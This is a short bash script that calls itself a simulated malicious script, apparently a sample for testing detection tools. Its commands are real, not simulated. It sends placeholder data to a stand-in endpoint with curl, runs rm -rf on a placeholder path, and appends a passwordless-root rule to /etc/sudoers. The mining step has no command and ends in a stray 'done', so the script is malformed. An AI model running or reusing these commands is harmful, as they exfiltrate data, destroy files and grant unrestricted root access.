#!/bin/bash

echo "Starting simulated malicious script..."

# Simulate data exfiltration
echo "Simulating data exfiltration..."
curl -X POST -d "data=SensitiveDataHere" http://example.com/malicious-endpoint

# Simulate file deletion
echo "Simulating file deletion..."
rm -rf /path/to/important/files/*

# Simulate privilege escalation attempt
echo "Simulating privilege escalation attempt..."
sudo bash -c 'echo "root ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers'

# Simulate cryptocurrency mining
echo "Simulating cryptocurrency mining..."
done
